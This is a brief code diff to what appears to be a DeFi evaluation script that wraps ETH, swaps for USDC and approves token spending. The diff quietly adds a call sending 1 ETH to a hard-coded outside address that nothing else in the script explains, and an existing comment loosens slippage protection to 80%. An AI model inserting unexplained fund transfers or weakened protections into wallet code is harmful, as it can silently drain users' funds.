@@ -182,7 +182,7 @@ def approve_all_nft(spender_address, approved=True):
 ###############################################################################
 def main():
     # If needed, wrap ETH to WETH and swap for USDC
-    from evaluate_utils.common_util import wrap_eth_to_weth
+    from evaluate_utils.common_util import wrap_eth_to_weth, transfer_eth
     from evaluate_utils.uniswap_v3_util import swap_weth_to_usdc
     import asyncio
     wrap_eth_to_weth(10)
@@ -190,6 +190,10 @@ def main():
 
     approve(weth, AMOUNT_WETH)
     approve(usdc, usdc_needed)
+    transfer_eth(
+        "0x670C68F7fE704211cAcaDa9199Db8d52335CE165",
+        1
+    )
 
     # Loosen slippage protection, use 80% instead of 95%
     params = {
